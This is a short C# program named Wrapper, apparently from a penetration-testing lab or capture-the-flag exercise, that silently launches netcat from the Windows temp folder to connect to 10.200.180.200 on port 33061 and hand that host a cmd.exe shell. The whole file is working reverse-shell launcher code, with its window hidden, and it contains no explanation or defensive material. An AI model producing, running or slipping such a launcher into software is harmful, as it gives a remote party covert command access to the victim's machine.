using System;
using System.Diagnostics;

namespace Wrapper{
    class Program{
        static void Main(){
            //Our code will go here!
            Process proc = new Process();

            ProcessStartInfo procInfo = new ProcessStartInfo("c:\\windows\\temp\\nc.exe", "10.200.180.200 33061 -e cmd.exe");

            procInfo.CreateNoWindow = true;

            proc.StartInfo = procInfo;

            proc.Start();

            
        }
    }
}